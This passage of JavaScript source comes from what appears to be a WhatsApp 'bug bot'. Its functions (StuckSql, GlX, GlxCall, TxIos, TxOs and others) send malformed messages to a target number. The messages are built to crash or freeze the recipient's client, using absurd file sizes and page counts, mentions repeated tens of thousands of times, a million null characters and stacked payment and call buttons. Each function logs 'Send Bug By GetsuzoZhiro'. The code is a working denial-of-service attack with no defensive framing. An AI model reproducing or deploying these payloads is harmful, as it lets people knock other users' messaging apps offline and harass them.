										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "@6281991410940".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉', url: \"https://youtube.com/PakTzy\", merchant_url: \"https://youtube.com/PakTzy\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["6281991410940@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function StuckSql(X, ThM, Ptcp = true) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					ephemeralMessage: {
						message: {
							interactiveMessage: {
								header: {
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 1316134911,
										mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
										fileName: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
										fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
										directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1726867151",
										contactVcard: true,
										jpegThumbnail: ThM,
									},
									hasMediaAttachment: true,
								},
								body: {
									text: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "@6281991410940".repeat(17000),
								},
								nativeFlowMessage: {
									buttons: [{
											name: "cta_url",
											buttonParamsJson: "{ display_text: '🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉', url: \"https://youtube.com/PakTzy\", merchant_url: \"https://youtube.com/PakTzy\" }",
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}",
										},
									],
									messageParamsJson: "{}",
								},
								contextInfo: {
									mentionedJid: ["6281991410940@s.whatsapp.net"],
									forwardingScore: 1,
									isForwarded: true,
									fromMe: false,
									participant: "0@s.whatsapp.net",
									remoteJid: "status@broadcast",
									quotedMessage: {
										documentMessage: {
											url: "https://mmg.whatsapp.net/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
											fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
											fileLength: "9999999999999",
											pageCount: 1316134911,
											mediaKey: "lCSc0f3rQVHwMkB90Fbjsk1gvO+taO4DuF+kBUgjvRw=",
											fileName: "𝐌𝐲𝐬𝐭𝐞𝐫𝐢𝐨𝐮𝐬 𝐌𝐞𝐧 𝐈𝐧 𝐂𝐲𝐛𝐞𝐫𝐒𝐩𝐚𝐜𝐞♻️",
											fileEncSha256: "wAzguXhFkO0y1XQQhFUI0FJhmT8q7EDwPggNb89u+e4=",
											directPath: "/v/t62.7119-24/23916836_520634057154756_7085001491915554233_n.enc?ccb=11-4&oh=01_Q5AaIC-Lp-dxAvSMzTrKM5ayF-t_146syNXClZWl3LMMaBvO&oe=66F0EDE2&_nc_sid=5e03e0",
											mediaKeyTimestamp: "1724474503",
											contactVcard: true,
											thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
											thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
											thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
											jpegThumbnail: "",
										},
									},
								},
							},
						},
					},
				}), {
					userJid: X,
					quoted: EsQl
				}
			);
			await VxoZap.relayMessage(X, etc.message, Ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function GlX(X, Ptcp = true) {
			await VxoZap.relayMessage(X, {
					viewOnceMessage: {
						message: {
							interactiveResponseMessage: {
								body: {
									text: "𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉",
									format: "EXTENSIONS_1"
								},
								nativeFlowResponseMessage: {
									name: 'galaxy_message',
									paramsJson: `{\"screen_2_OptIn_0\":true,\"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"@RaditX7\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤${"\u0000".repeat(1045000)}\",\"screen_0_TextInput_1\":\"INFINITE\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
									version: 3
								}
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function GlxCall(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "‎𝐓𝐡𝐞𝐆𝐞𝐭𝐬𝐮𝐳𝐨𝐙𝐡𝐢𝐫𝐨🐉"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: EsQl
				}
			);

			await VxoZap.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function GlxCallX(X, ThM, cct = false, ptcp = false) {
			let etc = generateWAMessageFromContent(X,
				proto.Message.fromObject({
					viewOnceMessage: {
						message: {
							interactiveMessage: {
								header: {
									title: "",
									documentMessage: {
										url: "https://mmg.whatsapp.net/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0&mms3=true",
										mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
										fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
										fileLength: "9999999999999",
										pageCount: 9007199254740991,
										mediaKey: "EZ/XTztdrMARBwsjTuo9hMH5eRvumy+F8mpLBnaxIaQ=",
										fileName: "🩸⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝐄𝐱ͯ͢𝐞𝐜𝐮͢𝐭𝐢𝐨𝐧 𝐕ͮ𝐚͢𝐮𝐥𝐭ཀ͜͡🦠",
										fileEncSha256: "oTnfmNW1xNiYhFxohifoE7nJgNZxcCaG15JVsPPIYEg=",
										directPath: "/v/t62.7119-24/30578306_700217212288855_4052360710634218370_n.enc?ccb=11-4&oh=01_Q5AaIOiF3XM9mua8OOS1yo77fFbI23Q8idCEzultKzKuLyZy&oe=66E74944&_nc_sid=5e03e0",
										mediaKeyTimestamp: "1723855952",
										contactVcard: true,
										thumbnailDirectPath: "/v/t62.36145-24/13758177_1552850538971632_7230726434856150882_n.enc?ccb=11-4&oh=01_Q5AaIBZON6q7TQCUurtjMJBeCAHO6qa0r7rHVON2uSP6B-2l&oe=669E4877&_nc_sid=5e03e0",
										thumbnailSha256: "njX6H6/YF1rowHI+mwrJTuZsw0n4F/57NaWVcs85s6Y=",
										thumbnailEncSha256: "gBrSXxsWEaJtJw4fweauzivgNm2/zdnJ9u1hZTxLrhE=",
										jpegThumbnail: ThM
									},
									hasMediaAttachment: true
								},
								body: {
									text: "‎⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤"
								},
								nativeFlowMessage: {
									messageParamsJson: "{\"name\":\"galaxy_message\",\"title\":\"oi\",\"header\":\" 𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ \",\"body\":\"xxx\"}",
									buttons: [
										cct ? {
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉" + "᬴".repeat(0) + "\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										} : {
											name: "payment_method",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_method",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "review_and_pay",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: ""
										},
										{
											name: "call_permission_request",
											buttonParamsJson: "{}"
										},
										{
											name: "payment_info",
											buttonParamsJson: "{}"
										},
										{
											name: "single_select",
											buttonParamsJson: "{\"title\":\"🎭⃟༑⌁⃰𝐙𝐞͢𝐫𝐨 𝑪͢𝒓𝒂ͯ͢𝒔𝒉ཀ͜͡🐉\",\"sections\":[{\"title\":\"𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ\",\"rows\":[]}]}"
										},
										{
											name: "galaxy_message",
											buttonParamsJson: "{\"flow_action\":\"navigate\",\"flow_action_payload\":{\"screen\":\"WELCOME_SCREEN\"},\"flow_cta\":\"〽️\",\"flow_id\":\"BY DEVORSIXCORE\",\"flow_message_version\":\"9\",\"flow_token\":\"MYPENISMYPENISMYPENIS\"}"
										},
										{
											name: "mpm",
											buttonParamsJson: "{}"
										}
									]
								}
							}
						}
					}
				}), {
					userJid: X,
					quoted: VisiX
				}
			);

			await VxoZap.relayMessage(X, etc.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function TxIos(X, Ptcp = false) {
			await VxoZap.relayMessage(X, {
					"extendedTextMessage": {
						"text": "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤",
						"contextInfo": {
							"stanzaId": "1234567890ABCDEF",
							"participant": "6281991410940@s.whatsapp.net",
							"quotedMessage": {
								"callLogMesssage": {
									"isVideo": true,
									"callOutcome": "1",
									"durationSecs": "0",
									"callType": "REGULAR",
									"participants": [{
										"jid": "6281991410940@s.whatsapp.net",
										"callOutcome": "1"
									}]
								}
							},
							"remoteJid": X,
							"conversionSource": "source_example",
							"conversionData": "Y29udmVyc2lvbl9kYXRhX2V4YW1wbGU=",
							"conversionDelaySeconds": 10,
							"forwardingScore": 9999999,
							"isForwarded": true,
							"quotedAd": {
								"advertiserName": "Example Advertiser",
								"mediaType": "IMAGE",
								"jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"caption": "This is an ad caption"
							},
							"placeholderKey": {
								"remoteJid": "6281991410940@s.whatsapp.net",
								"fromMe": false,
								"id": "ABCDEF1234567890"
							},
							"expiration": 86400,
							"ephemeralSettingTimestamp": "1728090592378",
							"ephemeralSharedSecret": "ZXBoZW1lcmFsX3NoYXJlZF9zZWNyZXRfZXhhbXBsZQ==",
							"externalAdReply": {
								"title": "𝐌𝐚𝐫𝐠𝐚 𝐓𝐢𝐳𝐢〽",
								"body": "𝐑𝐚𝐝𝐢𝐭 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ",
								"mediaType": "VIDEO",
								"renderLargerThumbnail": true,
								"previewTtpe": "VIDEO",
								"thumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7p5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
								"sourceType": " x ",
								"sourceId": " x ",
								"sourceUrl": "https://www.instagram.com/raditx7",
								"mediaUrl": "https://www.instagram.com/raditx7",
								"containsAutoReply": true,
								"renderLargerThumbnail": true,
								"showAdAttribution": true,
								"ctwaClid": "ctwa_clid_example",
								"ref": "ref_example"
							},
							"entryPointConversionSource": "entry_point_source_example",
							"entryPointConversionApp": "entry_point_app_example",
							"entryPointConversionDelaySeconds": 5,
							"disappearingMode": {},
							"actionLink": {
								"url": "https://www.instagram.com/raditx7"
							},
							"groupSubject": "Example Group Subject",
							"parentGroupJid": "6287888888888-1234567890@g.us",
							"trustBannerType": "trust_banner_example",
							"trustBannerAction": 1,
							"isSampled": false,
							"utm": {
								"utmSource": "utm_source_example",
								"utmCampaign": "utm_campaign_example"
							},
							"forwardedNewsletterMessageInfo": {
								"newsletterJid": "6287888888888-1234567890@g.us",
								"serverMessageId": 1,
								"newsletterName": " X ",
								"contentType": "UPDATE",
								"accessibilityText": " X "
							},
							"businessMessageForwardInfo": {
								"businessOwnerJid": "0@s.whatsapp.net"
							},
							"smbClientCampaignId": "smb_client_campaign_id_example",
							"smbServerCampaignId": "smb_server_campaign_id_example",
							"dataSharingContext": {
								"showMmDisclosure": true
							}
						}
					}
				},
				Ptcp ? {
					participant: {
						jid: X
					}
				} : {}
			);
			console.log(chalk.green("Send Bug By GetsuzoZhiro🐉"));
		};

		async function TxOs(X, Ptcp = false) {
			await VxoZap.relayMessage(X, {
					extendedTextMessage: {
						text: "⭑̤⟅̊༑ ▾ 𝐙͢𝐍ͮ𝐗 ⿻ 𝐈𝐍͢𝐕𝚫𝐒𝐈͢𝚯𝚴 ⿻ ▾ ༑̴⟆̊‏‎‏‎‏‎‏⭑̤\n" + "@6281991410940".repeat(15000),
						contextInfo: {
							mentionedJid: [
								"6281991410940@s.whatsapp.net",
								...Array.from({
									length: 15000
								}, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`)
							],
							stanzaId: "1234567890ABCDEF",
							participant: "0@s.whatsapp.net",
							quotedMessage: {
								callLogMesssage: {
									isVideo: true,
									callOutcome: "1",
									durationSecs: "0",
									callType: "REGULAR",
									participants: [{
										jid: "0@s.whatsapp.net",
										callOutcome: "1"
									}]
								}
							},
							remoteJid: X,
							conversionSource: " X ",
							conversionData: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgASAMBIgACEQEDEQH/xAAwAAADAQEBAQAAAAAAAAAAAAAABAUDAgYBAQEBAQEBAAAAAAAAAAAAAAAAAQIDBP/aAAwDAQACEAMQAAAAa4i3TThoJ/bUg9JER9UvkBoneppljfO/1jmV8u1DJv7qRBknbLmfreNLpWwq8n0E40cRaT6LmdeLtl/WZWbiY3z470JejkBaRJHRiuE5vSAmkKoXK8gDgCz/xAAsEAACAgEEAgEBBwUAAAAAAAABAgADBAUREiETMVEjEBQVIjJBQjNhYnFy/9oACAEBAAE/AMvKVPEBKqUtZrSdiF6nJr1NTqdwPYnNMJNyI+s01sPoxNbx7CA6kRUouTdJl4LI5I+xBk37ZG+/FopaxBZxAMrJqXd/1N6WPhi087n9+hG0PGt7JMzdDekcqZp2bZjWiq2XAWBTMyk1XHrozTMepMPkwlDrzff0vYmMq3M2Q5/5n9WxWO/vqV7nczIflZWgM1DTktauxeiDLPyeKaoD0Za9lOCmw3JlbE1EH27Ccmro8aDuVZpZkRk4kTHf6W/77zjzLvv3ynZKjeMoJH9pnoXDgDsCZ1ngxOPwJTULaqHG42EIazIA9ddiDC/OSWlXOupw0Z7kbettj8GUuwXd/wBZHQlR2XaMu5M1q7pK5g61XTWlbpGzKWdLq37iXISNoyhhLscK/PYmU1ty3/kfmWOtSgb9x8pKUZyf9CO9udkfLNMbTKEH1VJMbFxcVfJW0+9+B1JQlZ+NIwmHqFWVeQY3JrwR6AmblcbwP47zJZWs5Kej6mh4g7vaM6noJuJdjIWVwJfcgy0rA6ZZd1bYP8jNIdDQ/FBzWam9tVSPWxDmPZk3oFcE7RfKpExtSyMVeCepgaibOfkKiXZVIUlbASB1KOFfLKttHL9ljUVuxsa9diZhtjUVl6zM3KsQIUsU7xr7W9uZyb5M/8QAGxEAAgMBAQEAAAAAAAAAAAAAAREAECBRMWH/2gAIAQIBAT8Ap/IuUPM8wVx5UMcJgr//xAAdEQEAAQQDAQAAAAAAAAAAAAABAAIQESEgMVFh/9oACAEDAQE/ALY+wqSDk40Op7BTMEOywVPXErAhuNMDMdW//9k=",
